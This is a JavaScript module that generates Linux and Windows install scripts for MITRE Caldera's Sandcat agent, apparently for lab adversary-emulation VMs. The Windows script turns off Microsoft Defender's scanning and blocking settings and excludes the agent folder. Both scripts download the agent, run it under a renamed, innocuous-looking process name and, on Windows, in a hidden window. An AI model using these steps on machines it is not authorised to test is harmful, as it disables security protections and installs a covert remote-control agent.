'use strict';

// Sandcat's flags and download architecture header are defined upstream in
// https://github.com/mitre/sandcat/blob/master/gocat/sandcat.go and
// https://github.com/mitre/sandcat/blob/master/app/sand_svc.py.
// These scripts start a session agent; they do not install a service or task.

const GROUP_PATTERN = /^lane-[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$/;
const PAW_PATTERN = /^[a-f0-9]{24}$/;
const SERVER_PATTERN = /^https:\/\/[a-zA-Z0-9.-]+(?::[0-9]{1,5})?(?:\/agent\/[a-f0-9]{64})?\/?$/;

function validateOptions({ platform, serverUrl, group, paw } = {}) {
  if (platform !== 'windows' && platform !== 'linux') {
    throw new TypeError('Caldera agent platform must be windows or linux');
  }
  if (typeof serverUrl !== 'string' || !SERVER_PATTERN.test(serverUrl)) {
    throw new TypeError('Caldera agent server must be an HTTPS origin or an HTTPS /agent/<token> URL');
  }
  let parsed;
  try { parsed = new URL(serverUrl); } catch (_) {
    throw new TypeError('Caldera agent server URL is invalid');
  }
  if (!parsed.hostname.split('.').every(label => /^[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?$/.test(label))) {
    throw new TypeError('Caldera agent server hostname is invalid');
  }
  if (typeof group !== 'string' || !GROUP_PATTERN.test(group)) {
    throw new TypeError('Caldera agent group must be lane-<UUID> in lowercase');
  }
  if (typeof paw !== 'string' || !PAW_PATTERN.test(paw)) {
    throw new TypeError('Caldera agent paw must contain 24 lowercase hexadecimal characters');
  }
  return { platform, serverUrl: serverUrl.replace(/\/$/, ''), group, paw };
}

function buildLinuxScript({ serverUrl, group, paw }) {
  return `#!/bin/sh
set -eu
umask 077
server='${serverUrl}'
group='${group}'
paw='${paw}'
agent_dir="/opt/epm/$paw"
binary="$agent_dir/epmagent"
pid_file="$agent_dir/agent.pid"
log_file="$agent_dir/agent.log"
download="$agent_dir/epmagent.download"
# Where installs before the rename put the agent. Referenced ONLY to stop and
# remove it: two processes sharing one paw beacon twice and execute every
# ability twice, and nothing in Caldera would show why.
legacy_base="/opt/CyberCore"
legacy_root="$legacy_base/Caldera"
legacy_group_dir="$legacy_root/$group"
legacy_dir="$legacy_group_dir/$paw"
legacy_binary="$legacy_dir/mitre-sandcat"
fail() { printf '%s\\n' "CyberCore Caldera: $*" >&2; exit 1; }
for dependency in curl uname od tr mkdir chmod mv rm rmdir readlink nohup sleep cat; do
  command -v "$dependency" >/dev/null 2>&1 || fail "Required command missing: $dependency"
done
case "$(uname -m)" in
  x86_64|amd64) architecture=amd64 ;;
  aarch64|arm64) architecture=arm64 ;;
  *) fail 'Only amd64 and arm64 Linux machines are supported' ;;
esac
mkdir -p "$agent_dir"
chmod 700 "$agent_dir"
mkdir "$agent_dir/install.lock" 2>/dev/null || fail 'An installation is already running for this agent'
cleanup() {
  rm -f "$download"
  rmdir "$agent_dir/install.lock" 2>/dev/null || true
}
trap cleanup 0
trap 'exit 1' HUP INT TERM
legacy_running() {
  for legacy_proc in /proc/[0-9]*; do
    [ "$(readlink "$legacy_proc/exe" 2>/dev/null)" = "$legacy_binary" ] || continue
    printf '%s\\n' "\${legacy_proc#/proc/}"
  done
}
for legacy_pid in $(legacy_running); do
  kill "$legacy_pid" 2>/dev/null || true
done
attempt=0
while [ -n "$(legacy_running)" ]; do
  attempt=$((attempt + 1))
  [ "$attempt" -lt 10 ] || fail 'A previously installed agent is still running and could not be stopped; it would execute every ability a second time'
  sleep 1
done
rm -rf "$legacy_dir" 2>/dev/null || true
rmdir "$legacy_group_dir" "$legacy_root" "$legacy_base" 2>/dev/null || true
printf '%s\\n' 'CyberCore agent: downloading'
curl --fail --silent --show-error --connect-timeout 15 --max-time 90 \\
  --proto '=https' --request POST \\
  --header 'platform:linux' --header 'file:sandcat.go' \\
  --header "architecture:$architecture" \\
  --output "$download" "$server/file/download" || fail 'Sandcat download failed; check the Caldera server connection and certificate'
[ -s "$download" ] || fail 'Caldera returned an empty agent download'
magic=$(od -An -tx1 -N4 "$download" | tr -d ' \\n')
[ "$magic" = '7f454c46' ] || fail 'Caldera did not return a Linux executable'
chmod 700 "$download"
# Stopped by EXECUTABLE PATH, not by the saved PID — see the Windows branch for
# why. A stale or reused PID made the old code either refuse to proceed or
# report a healthy stop as a failure, and because the capability token is
# rotated before this script runs, that failure strands a still-running agent
# with a credential the gate no longer accepts.
managed_running() {
  for managed_proc in /proc/[0-9]*; do
    [ "$(readlink "$managed_proc/exe" 2>/dev/null)" = "$binary" ] || continue
    printf '%s\\n' "\${managed_proc#/proc/}"
  done
}
for managed_pid in $(managed_running); do
  kill "$managed_pid" 2>/dev/null || true
done
attempt=0
while [ -n "$(managed_running)" ]; do
  attempt=$((attempt + 1))
  [ "$attempt" -lt 15 ] || fail 'The existing managed agent did not stop'
  sleep 1
done
rm -f "$pid_file"
mv -f "$download" "$binary"
nohup "$binary" -server "$server" -group "$group" -paw "$paw" -v </dev/null >>"$log_file" 2>&1 &
managed_pid=$!
printf '%s\\n' "$managed_pid" >"$pid_file"
sleep 2
kill -0 "$managed_pid" 2>/dev/null || fail "Sandcat exited during startup; inspect $log_file"
printf '%s\\n' "CyberCore Caldera: MITRE Sandcat started; log: $log_file"
printf '%s\\n' "CYBERCORE_CALDERA_STARTED:$paw"
`;
}

function buildWindowsScript({ serverUrl, group, paw }) {
  return `$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$server = '${serverUrl}'
$group = '${group}'
$paw = '${paw}'
$installLock = $null
$download = $null
try {
  [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
  $machineArchitecture = $env:PROCESSOR_ARCHITEW6432
  if (-not $machineArchitecture) { $machineArchitecture = $env:PROCESSOR_ARCHITECTURE }
  switch ($machineArchitecture) {
    'AMD64' { $architecture = 'amd64' }
    'ARM64' { $architecture = 'arm64' }
    default { throw 'Only amd64 and arm64 Windows machines are supported' }
  }
  if (-not $env:ProgramData) { throw 'ProgramData is unavailable' }
  $agentDir = Join-Path $env:ProgramData ('EPM\\' + $paw)
  New-Item -ItemType Directory -Path $agentDir -Force | Out-Null
  $implantProcessName = 'epmagent'
  $binary = Join-Path $agentDir ($implantProcessName + '.exe')
  # Where installs before the rename put the agent. Referenced ONLY to stop and
  # remove it: two processes sharing one paw beacon twice and execute every
  # ability twice, and nothing in Caldera would show why.
  $legacyBase = Join-Path $env:ProgramData 'CyberCore'
  $legacyRoot = Join-Path $legacyBase 'Caldera'
  $legacyGroupDir = Join-Path $legacyRoot $group
  $legacyDir = Join-Path $legacyGroupDir $paw
  $legacyProcessName = 'mitre-sandcat'
  $legacyBinary = Join-Path $legacyDir ($legacyProcessName + '.exe')
  $pidFile = Join-Path $agentDir 'agent.pid'
  $stdoutLog = Join-Path $agentDir 'agent.stdout.log'
  $stderrLog = Join-Path $agentDir 'agent.stderr.log'
  $lockPath = Join-Path $agentDir 'install.lock'
  $installLock = [IO.File]::Open($lockPath, [IO.FileMode]::OpenOrCreate, [IO.FileAccess]::ReadWrite, [IO.FileShare]::None)
  $defenderCommands = @('Get-MpComputerStatus', 'Get-MpPreference', 'Set-MpPreference', 'Add-MpPreference')
  $missingDefenderCommands = @($defenderCommands | Where-Object { -not (Get-Command $_ -ErrorAction SilentlyContinue) })
  if ($missingDefenderCommands.Count -eq 0) {
    try {
      $defenderSettings = [ordered]@{
        DisableRealtimeMonitoring = $true
        DisableBehaviorMonitoring = $true
        DisableIOAVProtection = $true
        DisableScriptScanning = $true
        DisableBlockAtFirstSeen = $true
        PUAProtection = 0
      }
      $defenderSettingsMatch = {
        param($preferences)
        foreach ($setting in $defenderSettings.Keys) {
          $actual = $preferences.$setting
          if ($null -eq $actual -or $actual -ne $defenderSettings[$setting]) { return $false }
          if ($defenderSettings[$setting] -is [bool] -and $actual -isnot [bool]) { return $false }
        }
        return $true
      }
      $defenderStatus = Get-MpComputerStatus -ErrorAction Stop
      if ($defenderStatus.RealTimeProtectionEnabled -isnot [bool]) { throw 'Defender did not report its real-time protection state.' }
      $defenderPreferences = Get-MpPreference -ErrorAction Stop
      if ($defenderStatus.RealTimeProtectionEnabled -or -not (& $defenderSettingsMatch $defenderPreferences)) {
        Write-Output 'CyberCore Caldera: turning off Microsoft Defender scanning and blocking settings on this lab VM'
        Set-MpPreference @defenderSettings -ErrorAction Stop
      }
      if ($defenderPreferences.ExclusionPath -notcontains $agentDir) {
        Add-MpPreference -ExclusionPath $agentDir -ErrorAction Stop
      }
      $defenderReady = $false
      for ($attempt = 0; $attempt -lt 5; $attempt++) {
        if ($attempt -gt 0) { Start-Sleep -Seconds 1 }
        $defenderStatus = Get-MpComputerStatus -ErrorAction Stop
        $defenderPreferences = Get-MpPreference -ErrorAction Stop
        if ($defenderStatus.RealTimeProtectionEnabled -is [bool] -and -not $defenderStatus.RealTimeProtectionEnabled -and
            (& $defenderSettingsMatch $defenderPreferences) -and $defenderPreferences.ExclusionPath -contains $agentDir) {
          $defenderReady = $true
          break
        }
      }
      if (-not $defenderReady) {
        $differences = @()
        if ($defenderStatus.RealTimeProtectionEnabled -isnot [bool]) {
          $differences += 'RealTimeProtectionEnabled=unknown'
        } elseif ($defenderStatus.RealTimeProtectionEnabled) {
          $differences += 'RealTimeProtectionEnabled=True'
        }
        foreach ($setting in $defenderSettings.Keys) {
          $actual = $defenderPreferences.$setting
          if ($null -eq $actual -or $actual -ne $defenderSettings[$setting] -or
              ($defenderSettings[$setting] -is [bool] -and $actual -isnot [bool])) {
            $actualText = if ($null -eq $actual) { 'unknown' } else { [string]$actual }
            $differences += ($setting + '=' + $actualText)
          }
        }
        $folderExcluded = $defenderPreferences.ExclusionPath -contains $agentDir
        if (-not $folderExcluded) { $differences += 'AgentFolderExcluded=unverified' }
        $tamperState = if ($defenderStatus.IsTamperProtected -is [bool]) { [string]$defenderStatus.IsTamperProtected } else { 'unknown' }
        $details = 'Tamper Protection=' + $tamperState + '; ' + ($differences -join '; ')
        if (-not $folderExcluded -or $defenderStatus.RealTimeProtectionEnabled -isnot [bool]) {
          throw ('Defender verification failed. ' + $details)
        }
        Write-Output ('CYBERCORE_CALDERA_WARNING:Defender protections remain enabled or unverified. ' + $details + '. The agent folder exclusion is configured; continuing installation.')
      } else {
        Write-Output ('CyberCore Caldera: Defender scanning and blocking settings are off; excluded agent folder: ' + $agentDir)
      }
    } catch {
      throw ('Could not turn off Microsoft Defender protections for the Caldera lab agent. Check Tamper Protection or managed policy on this VM. ' + $_.Exception.Message)
    }
  } else {
    Write-Output 'CyberCore Caldera: Microsoft Defender management commands are unavailable; continuing without changing security settings'
  }
  $legacyRunning = { @(Get-Process -Name $legacyProcessName -ErrorAction SilentlyContinue |
    Where-Object { $_.Path -eq $legacyBinary }) }
  $legacyFound = & $legacyRunning
  foreach ($legacyProcess in $legacyFound) {
    try { Stop-Process -Id $legacyProcess.Id -Force -ErrorAction Stop } catch {}
  }
  if ($legacyFound.Count -gt 0) {
    $legacyStopped = $false
    foreach ($wait in 1..10) {
      if ((& $legacyRunning).Count -eq 0) { $legacyStopped = $true; break }
      Start-Sleep -Seconds 1
    }
    if (-not $legacyStopped) {
      throw 'A previously installed agent is still running and could not be stopped; it would execute every ability a second time'
    }
  }
  if (Get-Command Remove-MpPreference -ErrorAction SilentlyContinue) {
    try { Remove-MpPreference -ExclusionPath $legacyDir -ErrorAction Stop } catch {}
  }
  Remove-Item -LiteralPath $legacyDir -Recurse -Force -ErrorAction SilentlyContinue
  foreach ($legacyStale in @($legacyGroupDir, $legacyRoot, $legacyBase)) {
    if ((Test-Path -LiteralPath $legacyStale) -and
        -not (Get-ChildItem -LiteralPath $legacyStale -Force -ErrorAction SilentlyContinue)) {
      Remove-Item -LiteralPath $legacyStale -Force -ErrorAction SilentlyContinue
    }
  }
  if (Test-Path -LiteralPath $legacyDir) {
    Write-Output 'CYBERCORE_CALDERA_WARNING:legacy_agent_dir_retained'
  }
  $download = Join-Path $agentDir ('epmagent-' + [Guid]::NewGuid().ToString('N') + '.download')
  Write-Output 'CyberCore Caldera: downloading MITRE Sandcat'
  $headers = @{ 'platform' = 'windows'; 'file' = 'sandcat.go'; 'architecture' = $architecture }
  Invoke-WebRequest -UseBasicParsing -Method Post -Uri ($server + '/file/download') -Headers $headers -OutFile $download -TimeoutSec 90 -MaximumRedirection 0
  if (-not (Test-Path -LiteralPath $download) -or (Get-Item -LiteralPath $download).Length -lt 2) { throw 'Caldera returned an empty agent download' }
  $stream = [IO.File]::OpenRead($download)
  try {
    if ($stream.ReadByte() -ne 77 -or $stream.ReadByte() -ne 90) { throw 'Caldera did not return a Windows executable' }
  } finally { $stream.Dispose() }
  # Stopped by EXECUTABLE PATH, not by the saved PID.
  #
  # The PID file is a hint that goes stale: a reboot reuses PIDs, and a
  # recorded PID that now belongs to something else made the old code throw
  # "the saved PID belongs to another process" and abort. Worse, the previous
  # version verified the PID, killed it, then re-checked with Get-Process --
  # which finds a REUSED PID too, so a healthy stop reported
  # "The existing managed agent did not stop" and failed the install.
  #
  # That failure is not recoverable by retrying, because the capability token
  # is rotated by the atomic claim BEFORE this script runs: the agent that
  # would not die keeps beaconing with a credential the gate no longer
  # accepts, so it is alive, mute, and invisible. 72 agents were stranded
  # exactly this way.
  #
  # Matching on the path is strictly narrower than trusting a PID: it can only
  # ever stop a process running OUR binary, so the guard the old code was
  # reaching for is stronger here, not weaker.
  $managedRunning = { @(Get-Process -Name $implantProcessName -ErrorAction SilentlyContinue |
    Where-Object { [string]::Equals($_.Path, $binary, [StringComparison]::OrdinalIgnoreCase) }) }
  $managedFound = & $managedRunning
  foreach ($managedProcess in $managedFound) {
    try { Stop-Process -Id $managedProcess.Id -Force -ErrorAction Stop } catch {}
  }
  if ($managedFound.Count -gt 0) {
    $managedStopped = $false
    foreach ($wait in 1..15) {
      if ((& $managedRunning).Count -eq 0) { $managedStopped = $true; break }
      Start-Sleep -Seconds 1
    }
    if (-not $managedStopped) { throw 'The existing managed agent did not stop' }
  }
  Remove-Item -LiteralPath $pidFile -Force -ErrorAction SilentlyContinue
  Move-Item -LiteralPath $download -Destination $binary -Force
  $agentArguments = @('-server', $server, '-group', $group, '-paw', $paw, '-v')
  $agentProcess = Start-Process -FilePath $binary -ArgumentList $agentArguments -WorkingDirectory $agentDir -WindowStyle Hidden -RedirectStandardOutput $stdoutLog -RedirectStandardError $stderrLog -PassThru
  [IO.File]::WriteAllText($pidFile, [string]$agentProcess.Id)
  Start-Sleep -Seconds 2
  $agentProcess.Refresh()
  if ($agentProcess.HasExited) { throw ('Sandcat exited during startup; inspect ' + $stderrLog) }
  Write-Output ('CyberCore Caldera: MITRE Sandcat started; logs: ' + $agentDir)
  Write-Output ('CYBERCORE_CALDERA_STARTED:' + $paw)
} catch {
  $exception = $_.Exception
  $message = $exception.Message
  while ($exception) {
    # ERROR_VIRUS_INFECTED / ERROR_VIRUS_DELETED, including PowerShell's wrapped IO errors.
    $blockedBySecurity = $exception.HResult -eq -2147024671 -or $exception.HResult -eq -2147024670
    if ($exception -is [ComponentModel.Win32Exception]) {
      $blockedBySecurity = $blockedBySecurity -or $exception.NativeErrorCode -eq 225 -or $exception.NativeErrorCode -eq 226
    }
    if ($blockedBySecurity) {
      $message = 'Windows security software blocked MITRE Sandcat as malware or potentially unwanted software. Review Windows Security > Virus & threat protection > Protection history (or your endpoint security console) on this VM. Allow this lab agent under your approved lab policy, then retry Install Agent. Agent folder: ' + $agentDir
      break
    }
    $exception = $exception.InnerException
  }
  [Console]::Error.WriteLine('CyberCore Caldera: ' + $message)
  exit 1
} finally {
  if ($download -and (Test-Path -LiteralPath $download)) { Remove-Item -LiteralPath $download -Force -ErrorAction SilentlyContinue }
  if ($installLock) { $installLock.Dispose() }
}
`;
}

function buildInstallScript(options) {
  const validated = validateOptions(options);
  return validated.platform === 'windows' ? buildWindowsScript(validated) : buildLinuxScript(validated);
}

module.exports = { buildInstallScript };
